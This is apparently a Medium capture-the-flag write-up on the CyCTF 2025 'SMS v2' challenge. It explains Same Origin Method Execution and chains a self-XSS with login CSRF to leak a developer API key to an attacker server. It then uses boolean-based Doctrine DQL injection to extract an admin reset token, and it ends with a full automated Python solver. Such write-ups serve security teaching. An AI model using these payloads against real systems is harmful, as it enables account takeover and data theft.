# Self-XSS to PII leak via Same Origin Method Execution to admin ATO via DQLi— SMS V2 CyCTF 2025 Quals

> **Author**: Kalawy
> **Published**: Nov 10, 2025

---

![Kalawy](https://miro.medium.com/v2/resize:fill:32:32/1*huvwWX-aLFA9Vav09K7yAw.jpeg)

158

2

Listen

Share

![image](https://miro.medium.com/v2/resize:fit:700/1*82K76LVTb2ni3sXDck1RDg.jpeg)

بسم الله، والصلاة والسلام على رسول الله
الحمد لله الذي عَلَّمَ بالقلم.. عَلَّمَ الإنسانَ ما لم يَعْلَم
والصلاةُ والسلامُ على خيرِ مُعَلِّمي الناسِ الخير محمد

It’s Kalawy, Zonkor, and Mushroom — back with another write-up. This time we chain a Self-XSS into a SAME-ORIGIN Method Execution (SOME) to snag a developer account, then pivot with a DQL injection to fully own the admin on an SMS v2 target from the CyCTF 2025 Quals.

## What’s the SOME?

SOME, or Same Origin Method/Function Execution, is a browser feature that allows a function hosted on a page to be executed from another, if and only if they’re on the same origin. In other words, this allows a page to control another as long as they share the same origin. For example, if you have a page A that runs example.com and another one that runs example.com/infoIf we can refer to page A in the code of page B somehow, we can execute A's functions from B. Let’s explain it differently, you have a page A that has this function:

```
function Greeting(name){
  document.getElementsByTagName("div")[0].innerHTML = `<h2>Hello ${name}</h2>`;
}
```

If we can get a reference to this page Page A on another page in the same origin, we can easily call this Greetingfunction from page B.

One common way to create such a reference is by using window.open(). When page A opens page B using window.open('/PageB.html'), a parent-child relationship is established. Page B can then refer back to its openerpage A, using the window.opener property. This grants page B access to the functions on page A.

Try to have a hands-on this example:

```
<!-- Page A.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page A</title>
</head>
<body>
    <h1>
        Here is page A
    </h1>
    <div>
    </div>
    <script>
        function Greeting(name){
            document.getElementsByTagName("div")[0].innerHTML = `<h2>Hello ${name}</h2>`;
        }
        // Open Page B in a new tab/window        
        window.open("/B.html");
    </script>
</body>
</html>
```

```
<!-- Page B.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page B</title>
</head>
<body>
    <h1>
        Here is page B
    </h1>

    <script>
      // From Page B, call the Greeting
      window.opener.Greeting("Zonkor and Mushroom");
    </script>
</body>
</html>
```

Here is the result:

![image](https://miro.medium.com/v2/resize:fit:700/1*ZyyMZAqfrHW2NGbTICNl5Q.png)

This feature inspired Ben Hayak to escalate limited JS execution into a critical one, performing something like CSRF. You can check this video.

## Exploiting SOME

Summarizing the technique used by Ben Hayak:

![image](https://miro.medium.com/v2/resize:fit:700/1*r7j5iyyrhFtMG8I1e7bfOA.gif)

- The attacker hosts a malicious HTMLwindow.open(“https://target.com/vulnerable”), on attacker.com(Page A) which opens a new window (Page B). This Page B is vulnerable to XSS.
- Redirecting the current window (Page A) to another target page that has a critical function/information which belongs to the same origin as Page B window.location.href='https://target.com/critical_func';.

You may be asking, Why not just control the vulnerable page without the second step (Redirection). Simply, we mentioned earlier that SOME is only allowed between two pages belong to the same origin and target.com differs from attacker.com, so this redirection guarantee the same origin rule.

## Diving into the challenge

I won’t go deeply into the details of reviewing the code, but it’s obvious that we have a Self-XSS on dashboard.phpdue to the usage of raw Twig filter, which ignores HTML escaping of the input.

```
$loader = new \Twig\Loader\ArrayLoader([
    'welcome' => "Welcome back, {{ username |raw }} !"
]);
```

Until now, it’s a self-XSS; it won’t be useful without an escalation.

## Get Kalawy’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

We have a bot that logs in as a developer, then visits the provided link. This developer has an /api/me.php endpoint that returns his API key. So our first goal is to leak this endpoint using the escalated XSS. The only way to deliver our XSS is to force the developer to log in to our account. lol, We turned the developer into a regular user. It became worse.

On some environment i would think of RCE using developer tools, but it’s not applicable here

So, what about if we load the critical data first, then CSRF the developer to log in with our account, therefore the XSS? Here is where the SOME came to the scene.

## Exploitation of SOME in this challenge

SOME exploitation states that the XSS should be opened in the child window (Page B) and the critical method/function/data in the parent (Page A).

This rule can be switched, in case of the child window listens to postMessage, but I don’t wanna make it more complex, so it’s left for the user

![image](https://miro.medium.com/v2/resize:fit:700/1*fCgu1kKk_46D7u7OR67HuA.png)

This part contains snippets from the solver at the end of this story

- Page A (Parent) Open Page B (child) that holds the CSRF.
- Page A (Parent) redirected to /api/me.php using window.location.href='http://web:80/api/me.php’
- CSRF (in page B) should wait until the parent window (Page A) is loaded, so we should add at least 100ms delay to our CSRF.
- The CSRF is submitted, letting us access Page A (parent) via the XSS and send its content (API Key) to our server fetch("http://attacker/leak?data="+btoa(window.opener.document.body.innerHTML).

```
ONE = r'''
<!-- 1 -->
 <script>
    window.open("/2")
    window.location.href = "http://web:80/api/me.php"
 </script>
 '''

SEOND = rf'''
<!-- 2 -->

<form action="http://web:80/login.php" method="post">
    <input type="text" name="username" value="&lt;script&gt;fetch(&quot;{ATTACKER}/leak?data=&quot;&#x2b;btoa(window.opener.document.body.innerHTML));&lt;/script&gt;" autocomplete>
    <input type="password" name="password" value="145263Mm123." autocomplete>
</form>
<script>
    setTimeout(function(){{document.forms[0].submit()}},100);
</script>
'''


@app.route('/1')
def serve_form():
    return render_template_string(ONE), 200, {'Content-Type': 'text/html; charset=utf-8'}

@app.route('/2')
def serve_form_sec():
    return render_template_string(SEOND), 200, {'Content-Type': 'text/html; charset=utf-8'}

@app.route("/leak")
def leak():
    global dev_data
    dev_data = request.args.get("data")
    return dev_data
```

Once you receive the API key, you are a developer. Now let’s exploit the second vulnerability (DQL injection)

## What even is DQL?

You need to know that the challenge uses Doctrine ORM (Object-Relational Mapper).

What it is: Doctrine is a library that maps your PHP objects directly to database tables. This User class is a Doctrine Entity, which acts as a blueprint for the users table in your database.

What is DQL: DQL (Doctrine Query Language) is the language you use to query these objects. Instead of writing raw SQL SELECT * FROM users, you write object-oriented queries like SELECT u FROM App\Entity\User u. The User.php file defines the object that DQL queries will find, create, or update.

## DQL Injection

We needed the API key to perform this step as the endpoint is protected.

In findFeedbackById(...) function indoctrine.php, there lies our injection point.

```
function findFeedbackById($id)
{
    $qb = getEntityManager()->createQueryBuilder();
    $qb->select('f')
        ->from(\App\Entity\Feedback::class, 'f')
        ->where("f.id = " .$id)      // <-- Injection Point
        ->orderBy('f.createdAt', 'DESC');

    try {
        return $qb->getQuery()->getResult();
    } catch (\Exception $e) {
        return [];
    }
}
```

We can inject the $id parameter directly, as it is concatenated into the DQL query without any sanitization.

The first thought that comes to mind is: Let’s just insert a new user with an admin role, or even update ours! But it didn’t work out.

After some research (with ChatGPT research), I found out that DQL parser expects a single statement type, single query, so we can’t just terminate the current query with a semicolon (;) and add another one, it has to be a single query.

What can we do then? We can try to leak data! Like the admin password reset token. Decided to look up Google and found this interesting research: DQL injection. Check the “Boolean Based” part:

```
1 or 1=(select 1 from App\Entity\User a where a.id=1 and substring(a.password,1,1)='$')
```

This simply is utilizing subqueries to extract data character by character. If the sub query select 1 from App\Entity\User a where a.id=1 and substring(a.password,1,1)='$' returns true, the whole query will return true; therefore, we get some data, else we get an empty result.

That’s exactly what we did to extract the admin password reset token, character by character. The right payload in our case would be:

```
1 and 1=(select 1 from App\Entity\User a where a.id=1 and substring(a.code,1,1)='a')
```

here substring(a.code,1,1)='a' checks if the first character of the admin reset token is 'a'. We loop through all possible characters, then the second one, and we change it to substring(a.code,2,1)='b' and so on.

Make sure to put at least one feedback in the database, else you will always get empty result.

And this wraps it! You extract the reset token, reset the admin’s password, log in as admin, and get the flag from flag.php.

Here is a full version solver that automates the whole process:

Make sure to submit one feedback before running the script to avoid empty in the DQL injection step.

```
from flask import Flask, render_template_string,request
from requests import post,get
import threading, base64,json,urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

lock = threading.Lock()
TARGET = input("Your instance URL: ")
if "https" not in TARGET:
    TARGET.replace("http","https")
ATTACKER = input("your interface that will run this app: e.g http://142.90.81.1:9999: ").strip("/")
dev_data = ""
API_key = ""
reset_token = ""
CHARS = "abcdef0123456789"

app = Flask(__name__)

ONE = r'''
<!-- 1 -->
 <script>
    window.open("/2")
    window.location.href = "http://web:80/api/me.php"
 </script>
 '''

SEOND = rf'''
<!-- 2 -->

<form action="http://web:80/login.php" method="post">
    <input type="text" name="username" value="&lt;script&gt;fetch(&quot;{ATTACKER}/leak?data=&quot;&#x2b;btoa(window.opener.document.body.innerHTML));&lt;/script&gt;" autocomplete>
    <input type="password" name="password" value="145263Mm123." autocomplete>
</form>
<script>
    setTimeout(function(){{document.forms[0].submit()}},100);
</script>
'''


def signup():
    post(f"{TARGET}/register.php",data={'username':f'<script>fetch("{ATTACKER}/leak?data="+btoa(window.opener.document.body.innerHTML));</script>','password':'145263Mm123.','confirm_password':'145263Mm123.'})

def report():
    post(f"{TARGET}/report_issue.php",data={"url":f"{ATTACKER}/1"})

def decode_data():
    global dev_data
    global API_key
    dev_data = dev_data.strip().replace(" ", "+")
    dev_data += "=" * (-len(dev_data) % 4)
    dev_data = base64.b64decode(dev_data).decode("utf-8").strip("<pre>").strip("</pre><div class=\"json-formatter-container\"></div")
    API_key = json.loads(dev_data)['api_key']

@app.route('/1')
def serve_form():
    return render_template_string(ONE), 200, {'Content-Type': 'text/html; charset=utf-8'}

@app.route('/2')
def serve_form_sec():
    return render_template_string(SEOND), 200, {'Content-Type': 'text/html; charset=utf-8'}

@app.route("/leak")
def leak():
    global dev_data
    dev_data = request.args.get("data")
    return dev_data

def check_char(i, j, stop_event):
    if stop_event.is_set():
        return None
    payload = f"20 or 1=(select 1 from App\\Entity\\User a where a.id=1 and substring(a.code,{i},1)='{j}')"
    try:
        r = get(f"{TARGET}/api/search_feedback.php?feedback_id={payload}",
                headers={"X-API-Key": API_key}).text
        
    except:
        return None
    if "test feedback" in r:
        stop_event.set()
        return j
    return None

def admin_takeover():
    global reset_token
    post(f"{TARGET}/forgot_password.php", data={"username":"admin"},cookies={"PHPSESSID":"a"})
    print("Brute forcing the admin reset password token")
    for i in range(1, 65):
        stop_event = threading.Event()
        found_char = None
        with ThreadPoolExecutor(max_workers=len(CHARS)) as executor:
            futures = {executor.submit(check_char, i, ch, stop_event): ch for ch in CHARS}
            try:
                for fut in as_completed(futures):
                    res = fut.result()
                    if res:
                        found_char = res
                        break
            finally:
                for fut in futures:
                    if not fut.done():
                        fut.cancel()

        if found_char:
            with lock:
                reset_token += found_char
        else:
            print(f"[-] no character found at position {i}. stopping enumeration.")
            break
    print("admin Reset password token: "+reset_token)
    print("Obtaining the flag ")
    post(f"{TARGET}/reset.php",data={"new_password":"145263Mm123.","code":reset_token},cookies={"PHPSESSID":"a"}).text

def get_flag():
    admin_PHPSESSID = post(f"{TARGET}/login.php",data={"username":"admin","password":"145263Mm123."},allow_redirects=False).cookies.get("PHPSESSID")
    print(get(f"{TARGET}/flag.php",cookies={"PHPSESSID":admin_PHPSESSID}).text)

if __name__ == '__main__':
    signup()
    server = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=9999, debug=False, use_reloader=False))
    server.start()
    report()
    while(True):
        if(dev_data):
            break
    decode_data()
    admin_takeover()
    get_flag()
```

Download it here

![image](https://miro.medium.com/v2/resize:fit:700/1*lpozgu2M5_22fb3e-85BRw.png)

That’s all for this write-up, see you soon.

If you reach here, here is another write-up that may interest you:

## Cookie Shadowing and CSP bypass to read httpOnly cookie— Way too easy (CONCTF finals)

### بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ

kalawy.medium.com



---
*Original URL: [https://medium.com/@kalawy/self-xss-to-pii-leak-via-same-origin-method-execution-to-admin-ato-via-dqli-sms-v2-cyctf-2025-ee79ee89055e?source=search_post---------135-----------------------------------](https://medium.com/@kalawy/self-xss-to-pii-leak-via-same-origin-method-execution-to-admin-ato-via-dqli-sms-v2-cyctf-2025-ee79ee89055e?source=search_post---------135-----------------------------------)*
